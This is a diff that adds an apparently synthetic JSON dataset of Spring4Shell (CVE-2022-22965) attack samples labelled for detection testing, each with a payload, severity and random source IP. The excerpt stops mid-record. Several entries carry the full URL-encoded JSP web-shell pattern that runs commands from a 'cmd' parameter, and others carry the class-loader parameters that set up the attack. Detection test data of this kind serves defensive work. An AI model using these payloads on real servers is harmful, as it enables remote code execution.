@@ -1,0 +1,1002 @@
+[
+  {
+    "id": "spring4shell_0000",
+    "type": "spring4shell",
+    "cve": "CVE-2022-22965",
+    "payload": "class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "213.218.149.193",
+    "timestamp": "2026-03-13T21:53:09.060452"
+  },
+  {
+    "id": "spring4shell_0001",
+    "type": "spring4shell",
+    "cve": "CVE-2022-22965",
+    "payload": "class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "98.48.73.142",
+    "timestamp": "2026-03-13T21:53:09.060457"
+  },
+  {
+    "id": "spring4shell_0002",
+    "type": "spring4shell",
+    "cve": "CVE-2022-22965",
+    "payload": "class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "155.197.251.90",
+    "timestamp": "2026-03-13T21:53:09.060462"
+  },
+  {
+    "id": "spring4shell_0003",
+    "type": "spring4shell",
+    "cve": "CVE-2022-22965",
+    "payload": "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "119.176.44.4",
+    "timestamp": "2026-03-13T21:53:09.060469"
+  },
+  {
+    "id": "spring4shell_0004",
+    "type": "spring4shell",
+    "cve": "CVE-2022-22965",
+    "payload": "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "184.224.232.1",
+    "timestamp": "2026-03-13T21:53:09.060474"
+  },
+  {
+    "id": "spring4shell_0005",
+    "type": "spring4shell",
+    "cve": "CVE-2022-22965",
+    "payload": "class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "144.125.199.7",
+    "timestamp": "2026-03-13T21:53:09.060479"
+  },
+  {
+    "id": "spring4shell_0006",
+    "type": "spring4shell",
+    "cve": "CVE-2022-22965",
+    "payload": "class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "17.9.22.41",
+    "timestamp": "2026-03-13T21:53:09.060485"
+  },
+  {
+    "id": "spring4shell_0007",
+    "type": "spring4shell",
+    "cve": "CVE-2022-22965",
+    "payload": "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "134.82.42.197",
+    "timestamp": "2026-03-13T21:53:09.060490"
+  },
+  {
+    "id": "spring4shell_0008",
+    "type": "spring4shell",
+    "cve": "CVE-2022-22965",
+    "payload": "class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "31.26.203.108",
+    "timestamp": "2026-03-13T21:53:09.060495"
+  },
+  {
+    "id": "spring4shell_0009",
+    "type": "spring4shell",
+    "cve": "CVE-2022-22965",
+    "payload": "class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "161.179.179.128",
+    "timestamp": "2026-03-13T21:53:09.060500"
+  },
+  {
+    "id": "spring4shell_0010",
+    "type": "spring4shell",
+    "cve": "CVE-2022-22965",
+    "payload": "class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "91.198.56.240",
+    "timestamp": "2026-03-13T21:53:09.060505"
+  },
+  {
+    "id": "spring4shell_0011",
+    "type": "spring4shell",
+    "cve": "CVE-2022-22965",
+    "payload": "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "32.103.74.186",
+    "timestamp": "2026-03-13T21:53:09.060509"
+  },
+  {
+    "id": "spring4shell_0012",
+    "type": "spring4shell",
+    "cve": "CVE-2022-22965",
+    "payload": "class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "27.61.191.211",
+    "timestamp": "2026-03-13T21:53:09.060514"
+  },
+  {
+    "id": "spring4shell_0013",
+    "type": "spring4shell",
+    "cve": "CVE-2022-22965",
+    "payload": "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "176.7.189.231",
+    "timestamp": "2026-03-13T21:53:09.060518"
+  },
+  {
+    "id": "spring4shell_0014",
+    "type": "spring4shell",
+    "cve": "CVE-2022-22965",
+    "payload": "class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "150.104.59.226",
+    "timestamp": "2026-03-13T21:53:09.060523"
+  },
+  {
+    "id": "spring4shell_0015",
+    "type": "spring4shell",
+    "cve": "CVE-2022-22965",
+    "payload": "class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "158.219.136.15",
+    "timestamp": "2026-03-13T21:53:09.060527"
+  },
+  {
+    "id": "spring4shell_0016",
+    "type": "spring4shell",
+    "cve": "CVE-2022-22965",
+    "payload": "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "17.212.69.164",
+    "timestamp": "2026-03-13T21:53:09.060532"
+  },
+  {
+    "id": "spring4shell_0017",
+    "type": "spring4shell",
+    "cve": "CVE-2022-22965",
+    "payload": "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "25.234.198.5",
+    "timestamp": "2026-03-13T21:53:09.060536"
+  },
+  {
+    "id": "spring4shell_0018",
+    "type": "spring4shell",
+    "cve": "CVE-2022-22965",
+    "payload": "class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "221.87.252.93",
+    "timestamp": "2026-03-13T21:53:09.060541"
+  },
+  {
+    "id": "spring4shell_0019",
+    "type": "spring4shell",
+    "cve": "CVE-2022-22965",
+    "payload": "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "153.78.103.6",
+    "timestamp": "2026-03-13T21:53:09.060545"
+  },
+  {
+    "id": "spring4shell_0020",
+    "type": "spring4shell",
+    "cve": "CVE-2022-22965",
+    "payload": "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "82.208.77.64",
+    "timestamp": "2026-03-13T21:53:09.060550"
+  },
+  {
+    "id": "spring4shell_0021",
+    "type": "spring4shell",
+    "cve": "CVE-2022-22965",
+    "payload": "class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "13.117.205.53",
+    "timestamp": "2026-03-13T21:53:09.060554"
+  },
+  {
+    "id": "spring4shell_0022",
+    "type": "spring4shell",
+    "cve": "CVE-2022-22965",
+    "payload": "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "163.251.99.130",
+    "timestamp": "2026-03-13T21:53:09.060559"
+  },
+  {
+    "id": "spring4shell_0023",
+    "type": "spring4shell",
+    "cve": "CVE-2022-22965",
+    "payload": "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "75.121.169.163",
+    "timestamp": "2026-03-13T21:53:09.060567"
+  },
+  {
+    "id": "spring4shell_0024",
+    "type": "spring4shell",
+    "cve": "CVE-2022-22965",
+    "payload": "class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "203.159.180.30",
+    "timestamp": "2026-03-13T21:53:09.060572"
+  },
+  {
+    "id": "spring4shell_0025",
+    "type": "spring4shell",
+    "cve": "CVE-2022-22965",
+    "payload": "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "204.212.207.134",
+    "timestamp": "2026-03-13T21:53:09.060577"
+  },
+  {
+    "id": "spring4shell_0026",
+    "type": "spring4shell",
+    "cve": "CVE-2022-22965",
+    "payload": "class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "173.109.78.158",
+    "timestamp": "2026-03-13T21:53:09.060581"
+  },
+  {
+    "id": "spring4shell_0027",
+    "type": "spring4shell",
+    "cve": "CVE-2022-22965",
+    "payload": "module.classLoader.DefaultAssertionStatus=n",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "109.92.137.95",
+    "timestamp": "2026-03-13T21:53:09.060586"
+  },
+  {
+    "id": "spring4shell_0028",
+    "type": "spring4shell",
+    "cve": "CVE-2022-22965",
+    "payload": "class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "150.231.79.55",
+    "timestamp": "2026-03-13T21:53:09.060590"
+  },
+  {
+    "id": "spring4shell_0029",
+    "type": "spring4shell",
+    "cve": "CVE-2022-22965",
+    "payload": "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "220.198.169.210",
+    "timestamp": "2026-03-13T21:53:09.060597"
+  },
+  {
+    "id": "spring4shell_0030",
+    "type": "spring4shell",
+    "cve": "CVE-2022-22965",
+    "payload": "module.classLoader.DefaultAssertionStatus=n",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "147.33.192.81",
+    "timestamp": "2026-03-13T21:53:09.060601"
+  },
+  {
+    "id": "spring4shell_0031",
+    "type": "spring4shell",
+    "cve": "CVE-2022-22965",
+    "payload": "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "59.102.181.241",
+    "timestamp": "2026-03-13T21:53:09.060606"
+  },
+  {
+    "id": "spring4shell_0032",
+    "type": "spring4shell",
+    "cve": "CVE-2022-22965",
+    "payload": "class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "214.93.208.145",
+    "timestamp": "2026-03-13T21:53:09.060610"
+  },
+  {
+    "id": "spring4shell_0033",
+    "type": "spring4shell",
+    "cve": "CVE-2022-22965",
+    "payload": "module.classLoader.DefaultAssertionStatus=n",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "180.44.241.233",
+    "timestamp": "2026-03-13T21:53:09.060615"
+  },
+  {
+    "id": "spring4shell_0034",
+    "type": "spring4shell",
+    "cve": "CVE-2022-22965",
+    "payload": "module.classLoader.classLoaderResources.context.parent.pipeline.first.pattern=...",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "11.114.200.167",
+    "timestamp": "2026-03-13T21:53:09.060619"
+  },
+  {
+    "id": "spring4shell_0035",
+    "type": "spring4shell",
+    "cve": "CVE-2022-22965",
+    "payload": "module.classLoader.classLoaderResources.context.parent.pipeline.first.pattern=...",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "210.175.203.15",
+    "timestamp": "2026-03-13T21:53:09.060624"
+  },
+  {
+    "id": "spring4shell_0036",
+    "type": "spring4shell",
+    "cve": "CVE-2022-22965",
+    "payload": "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "64.120.161.160",
+    "timestamp": "2026-03-13T21:53:09.060628"
+  },
+  {
+    "id": "spring4shell_0037",
+    "type": "spring4shell",
+    "cve": "CVE-2022-22965",
+    "payload": "class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "174.194.235.88",
+    "timestamp": "2026-03-13T21:53:09.060633"
+  },
+  {
+    "id": "spring4shell_0038",
+    "type": "spring4shell",
+    "cve": "CVE-2022-22965",
+    "payload": "module.classLoader.classLoaderResources.context.parent.pipeline.first.pattern=...",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "45.69.157.65",
+    "timestamp": "2026-03-13T21:53:09.060637"
+  },
+  {
+    "id": "spring4shell_0039",
+    "type": "spring4shell",
+    "cve": "CVE-2022-22965",
+    "payload": "class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "31.171.240.75",
+    "timestamp": "2026-03-13T21:53:09.060660"
+  },
+  {
+    "id": "spring4shell_0040",
+    "type": "spring4shell",
+    "cve": "CVE-2022-22965",
+    "payload": "module.classLoader.classLoaderResources.context.parent.pipeline.first.pattern=...",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "61.132.201.107",
+    "timestamp": "2026-03-13T21:53:09.060665"
+  },
+  {
+    "id": "spring4shell_0041",
+    "type": "spring4shell",
+    "cve": "CVE-2022-22965",
+    "payload": "class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "53.237.165.145",
+    "timestamp": "2026-03-13T21:53:09.060669"
+  },
+  {
+    "id": "spring4shell_0042",
+    "type": "spring4shell",
+    "cve": "CVE-2022-22965",
+    "payload": "class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "92.0.175.136",
+    "timestamp": "2026-03-13T21:53:09.060676"
+  },
+  {
+    "id": "spring4shell_0043",
+    "type": "spring4shell",
+    "cve": "CVE-2022-22965",
+    "payload": "module.classLoader.classLoaderResources.context.parent.pipeline.first.pattern=...",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "85.119.95.232",
+    "timestamp": "2026-03-13T21:53:09.060681"
+  },
+  {
+    "id": "spring4shell_0044",
+    "type": "spring4shell",
+    "cve": "CVE-2022-22965",
+    "payload": "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "18.48.159.43",
+    "timestamp": "2026-03-13T21:53:09.060685"
+  },
+  {
+    "id": "spring4shell_0045",
+    "type": "spring4shell",
+    "cve": "CVE-2022-22965",
+    "payload": "class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "156.68.20.95",
+    "timestamp": "2026-03-13T21:53:09.060690"
+  },
+  {
+    "id": "spring4shell_0046",
+    "type": "spring4shell",
+    "cve": "CVE-2022-22965",
+    "payload": "class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "169.63.193.105",
+    "timestamp": "2026-03-13T21:53:09.060694"
+  },
+  {
+    "id": "spring4shell_0047",
+    "type": "spring4shell",
+    "cve": "CVE-2022-22965",
+    "payload": "class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "216.168.3.119",
+    "timestamp": "2026-03-13T21:53:09.060699"
+  },
+  {
+    "id": "spring4shell_0048",
+    "type": "spring4shell",
+    "cve": "CVE-2022-22965",
+    "payload": "class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "142.217.131.54",
+    "timestamp": "2026-03-13T21:53:09.060706"
+  },
+  {
+    "id": "spring4shell_0049",
+    "type": "spring4shell",
+    "cve": "CVE-2022-22965",
+    "payload": "class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "73.152.22.117",
+    "timestamp": "2026-03-13T21:53:09.060711"
+  },
+  {
+    "id": "spring4shell_0050",
+    "type": "spring4shell",
+    "cve": "CVE-2022-22965",
+    "payload": "module.classLoader.classLoaderResources.context.parent.pipeline.first.pattern=...",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "15.137.30.249",
+    "timestamp": "2026-03-13T21:53:09.060715"
+  },
+  {
+    "id": "spring4shell_0051",
+    "type": "spring4shell",
+    "cve": "CVE-2022-22965",
+    "payload": "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "192.140.15.241",
+    "timestamp": "2026-03-13T21:53:09.060720"
+  },
+  {
+    "id": "spring4shell_0052",
+    "type": "spring4shell",
+    "cve": "CVE-2022-22965",
+    "payload": "module.classLoader.classLoaderResources.context.parent.pipeline.first.pattern=...",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "85.247.87.3",
+    "timestamp": "2026-03-13T21:53:09.060724"
+  },
+  {
+    "id": "spring4shell_0053",
+    "type": "spring4shell",
+    "cve": "CVE-2022-22965",
+    "payload": "class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "37.163.9.182",
+    "timestamp": "2026-03-13T21:53:09.060729"
+  },
+  {
+    "id": "spring4shell_0054",
+    "type": "spring4shell",
+    "cve": "CVE-2022-22965",
+    "payload": "module.classLoader.classLoaderResources.context.parent.pipeline.first.pattern=...",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "100.106.239.36",
+    "timestamp": "2026-03-13T21:53:09.060733"
+  },
+  {
+    "id": "spring4shell_0055",
+    "type": "spring4shell",
+    "cve": "CVE-2022-22965",
+    "payload": "module.classLoader.DefaultAssertionStatus=n",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "140.182.178.119",
+    "timestamp": "2026-03-13T21:53:09.060738"
+  },
+  {
+    "id": "spring4shell_0056",
+    "type": "spring4shell",
+    "cve": "CVE-2022-22965",
+    "payload": "class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "156.138.221.115",
+    "timestamp": "2026-03-13T21:53:09.060742"
+  },
+  {
+    "id": "spring4shell_0057",
+    "type": "spring4shell",
+    "cve": "CVE-2022-22965",
+    "payload": "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "165.157.94.54",
+    "timestamp": "2026-03-13T21:53:09.060746"
+  },
+  {
+    "id": "spring4shell_0058",
+    "type": "spring4shell",
+    "cve": "CVE-2022-22965",
+    "payload": "module.classLoader.DefaultAssertionStatus=n",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "212.155.245.116",
+    "timestamp": "2026-03-13T21:53:09.060751"
+  },
+  {
+    "id": "spring4shell_0059",
+    "type": "spring4shell",
+    "cve": "CVE-2022-22965",
+    "payload": "class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "129.242.244.101",
+    "timestamp": "2026-03-13T21:53:09.060755"
+  },
+  {
+    "id": "spring4shell_0060",
+    "type": "spring4shell",
+    "cve": "CVE-2022-22965",
+    "payload": "class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "95.76.58.252",
+    "timestamp": "2026-03-13T21:53:09.060760"
+  },
+  {
+    "id": "spring4shell_0061",
+    "type": "spring4shell",
+    "cve": "CVE-2022-22965",
+    "payload": "module.classLoader.DefaultAssertionStatus=n",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "66.177.47.146",
+    "timestamp": "2026-03-13T21:53:09.060767"
+  },
+  {
+    "id": "spring4shell_0062",
+    "type": "spring4shell",
+    "cve": "CVE-2022-22965",
+    "payload": "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "110.220.245.83",
+    "timestamp": "2026-03-13T21:53:09.060774"
+  },
+  {
+    "id": "spring4shell_0063",
+    "type": "spring4shell",
+    "cve": "CVE-2022-22965",
+    "payload": "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "21.5.114.71",
+    "timestamp": "2026-03-13T21:53:09.060779"
+  },
+  {
+    "id": "spring4shell_0064",
+    "type": "spring4shell",
+    "cve": "CVE-2022-22965",
+    "payload": "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "156.20.209.23",
+    "timestamp": "2026-03-13T21:53:09.060784"
+  },
+  {
+    "id": "spring4shell_0065",
+    "type": "spring4shell",
+    "cve": "CVE-2022-22965",
+    "payload": "class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "206.233.28.130",
+    "timestamp": "2026-03-13T21:53:09.060789"
+  },
+  {
+    "id": "spring4shell_0066",
+    "type": "spring4shell",
+    "cve": "CVE-2022-22965",
+    "payload": "class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "22.67.251.6",
+    "timestamp": "2026-03-13T21:53:09.060793"
+  },
+  {
+    "id": "spring4shell_0067",
+    "type": "spring4shell",
+    "cve": "CVE-2022-22965",
+    "payload": "class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "143.39.141.143",
+    "timestamp": "2026-03-13T21:53:09.060798"
+  },
+  {
+    "id": "spring4shell_0068",
+    "type": "spring4shell",
+    "cve": "CVE-2022-22965",
+    "payload": "class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "58.79.60.229",
+    "timestamp": "2026-03-13T21:53:09.060802"
+  },
+  {
+    "id": "spring4shell_0069",
+    "type": "spring4shell",
+    "cve": "CVE-2022-22965",
+    "payload": "class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "29.105.187.164",
+    "timestamp": "2026-03-13T21:53:09.060806"
+  },
+  {
+    "id": "spring4shell_0070",
+    "type": "spring4shell",
+    "cve": "CVE-2022-22965",
+    "payload": "class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "11.30.237.82",
+    "timestamp": "2026-03-13T21:53:09.060811"
+  },
+  {
+    "id": "spring4shell_0071",
+    "type": "spring4shell",
+    "cve": "CVE-2022-22965",
+    "payload": "module.classLoader.DefaultAssertionStatus=n",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "55.195.115.95",
+    "timestamp": "2026-03-13T21:53:09.060815"
+  },
+  {
+    "id": "spring4shell_0072",
+    "type": "spring4shell",
+    "cve": "CVE-2022-22965",
+    "payload": "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "156.217.239.139",
+    "timestamp": "2026-03-13T21:53:09.060820"
+  },
+  {
+    "id": "spring4shell_0073",
+    "type": "spring4shell",
+    "cve": "CVE-2022-22965",
+    "payload": "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "84.191.111.194",
+    "timestamp": "2026-03-13T21:53:09.060824"
+  },
+  {
+    "id": "spring4shell_0074",
+    "type": "spring4shell",
+    "cve": "CVE-2022-22965",
+    "payload": "module.classLoader.classLoaderResources.context.parent.pipeline.first.pattern=...",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "7.226.31.249",
+    "timestamp": "2026-03-13T21:53:09.060831"
+  },
+  {
+    "id": "spring4shell_0075",
+    "type": "spring4shell",
+    "cve": "CVE-2022-22965",
+    "payload": "class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "11.49.18.82",
+    "timestamp": "2026-03-13T21:53:09.060836"
+  },
+  {
+    "id": "spring4shell_0076",
+    "type": "spring4shell",
+    "cve": "CVE-2022-22965",
+    "payload": "module.classLoader.DefaultAssertionStatus=n",
+    "severity": "critical",
+    "expected_detection": true,
